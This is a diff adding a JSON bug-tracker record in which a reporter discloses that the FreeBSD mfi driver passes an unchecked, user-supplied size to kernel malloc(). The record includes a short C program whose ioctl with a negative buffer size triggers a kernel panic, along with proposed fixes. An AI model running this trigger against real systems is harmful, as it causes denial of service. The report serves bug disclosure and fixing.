@@ -1,0 +1,8 @@
+{
+ "id": 661226,
+ "bug_id": 167107,
+ "attachment_id": 0,
+ "creation_time": "2012-04-19T20:10:12Z",
+ "creator": "lampa@fit.vutbr.cz",
+ "text": "Kernel malloc() doesn't check size argument, so it's possible to raise\nkernel panic using system call. Simple demonstration program:\n\n#include \u003csys/ioctl.h\u003e\n#include \u003csys/param.h\u003e\n#include \u003csys/sysctl.h\u003e\n#include \u003csys/uio.h\u003e\n#include \u003cfcntl.h\u003e\n#include \u003cstdio.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003cstring.h\u003e\n#include \u003cunistd.h\u003e\n#include \u003cdev/mfi/mfi_ioctl.h\u003e\n\nint main()\n{\n        struct mfi_ioc_passthru ioc;\n        struct mfi_dcmd_frame *dcmd;\n        char buf[1024];\n\n        int fd = open(\"/dev/mfi0\", O_RDONLY);\n        bzero(\u0026ioc, sizeof(ioc));\n        dcmd = \u0026ioc.ioc_frame;\n        dcmd-\u003eheader.cmd = MFI_CMD_DCMD;\n        dcmd-\u003eheader.timeout = 0;\n        dcmd-\u003eheader.flags = 0;\n        dcmd-\u003eheader.data_len = -8192;\n        dcmd-\u003eopcode = MFI_DCMD_CTRL_GETINFO;\n        ioc.buf = buf;\n        ioc.buf_size = -8192;\n        ioctl(fd, MFIIO_PASSTHRU, \u0026ioc);\n}\n\nResult:\n\npanic: kmem_malloc(-8192): kmem_map too small: 103632896 total allocated\n\nFix: \n\n1. Check malloc() size argument obtained from user space in\n   mfi_dcmd_command(). \n2. Change uma_large_malloc(), uma_small_alloc(), etc. prototypes from\n   int size to size_t size to be consistent with malloc() and kmem_malloc().\n3. Check if size argument is not larger then available memory in\n   kmem_malloc() and fail properly with return 0 and not panic."
+}
